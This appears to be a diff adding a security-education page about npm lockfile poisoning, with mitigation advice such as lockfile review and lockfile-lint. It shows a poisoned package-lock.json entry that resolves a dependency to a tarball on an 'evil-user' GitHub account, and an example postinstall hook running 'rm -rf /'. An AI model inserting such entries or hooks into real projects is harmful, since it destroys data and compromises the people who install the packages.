@@ -7,3 +7,89 @@ route: /attacks_explained/lockfile
 # Lockfile Attack
 
 
+
+## The Attack
+
+This attack is very specific to Nodejs ecosystem and it [was discovered in 2019](https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/) by [Liran Tal](https://twitter.com/liran_tal).
+
+It is quite common to include external dependencies in Nodejs. The ecosystem is heavily based in [NPM Registry (+1M packages)](https://www.npmjs.com/).
+
+Most projects manage their dependencies using Npm official client or Yarn. Since few years ago both tools introduced the lockfile concept to the ecosystem (`package-lock.json` and `yarn.lock`).
+
+If the project have a lockfile available the package manager will install the dependencies from the lockfile as a primary source of truth. This lead us to a new vector where a malicious actor can submit a poison dependency trough the lockfile as most of the maintainers doesn't review the lockfiles during the PR Reviews.
+
+This is regular `package-lock.json`.
+
+```json
+{
+  "name": "my-project",
+  "version": "0.0.1",
+  "lockfileVersion": 1,
+  "requires": true,
+  "dependencies": {
+    "@babel/code-frame": {
+      "version": "7.8.3",
+      "resolved": "https://registry.npmjs.org/@babel/code-frame/-/code-frame-7.8.3.tgz",
+      "integrity": "sha512-a9gxpmdXtZEInkCSHUJDLHZVBgb1QS0jhss4cPP93EW7s+uC5bikET2twEF3KV+7rDblJcmNvTR7VJejqd2C2g==",
+      "dev": true,
+      "requires": {
+        "@babel/highlight": "^7.8.3"
+      }
+    }
+    //...
+  }
+}
+```
+
+The malicious attack take place when the `resolved` and `integrity` are not corresponding to official sources:
+
+
+```json
+{
+  "name": "my-project",
+  "version": "0.0.1",
+  "lockfileVersion": 1,
+  "requires": true,
+  "dependencies": {
+    "@babel/code-frame": {
+      "version": "7.8.3",
+      "resolved": "https://github.com/evil-user/code-frame/tarball/master",
+      "integrity": "sha512-VT0ZI6kZRdTh8YyJw3SMbYm/u+NqfsAxEpWO0Pf9sq8/e94WxxOpPKx9FR1FlyCtOVDNOQ+8ntlqFxiRc+r5qA==",
+      "dev": true,
+      "requires": {
+        "@babel/highlight": "^7.8.3"
+      }
+    }
+    //...
+  }
+}
+```
+
+So the risk is that in this case is that `@babel/code-frame` is not installed from the NPM registry. This can lead to many attacks based on the npm lifecycle (pre-install, post-install...)
+
+As an example of malicious script added in the poisoned version of `@babel/code-frame`
+```
+"scripts": {
+   "postinstall": "rm -rf /",
+}
+```
+
+## The solution
+
+There are no definitive solutions to avoid this attack but can be highly mitigated.
+
+## Mitigation
+
+- Always review the lockfiles in the PRs.
+- Use a tool to check the lockfile sources enables like `lockfile-lint`
+    ```bash
+    npx lockfile-lint --path yarn.lock --type yarn --validate-https --allowed-hosts yarnpkg.org
+    ```
+- Include the validation tools in the CI process (testing phase and security checks)
+- Optional: You can include the sources validation with Git Hooks too (using Husky)
+
+
+### Refs
+- [Snyk | What is package lock json and how a lockfile works for yarn and npm packages?](https://snyk.io/blog/what-is-package-lock-json/)
+- [Snyk | Why npm lockfiles can be a security blindspot for injecting malicious modules](https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/)
+- [Medium | Everything You Wanted To Know About package-lock.json But Were Too Afraid To Ask](https://medium.com/coinmonks/everything-you-wanted-to-know-about-package-lock-json-b81911aa8ab8)
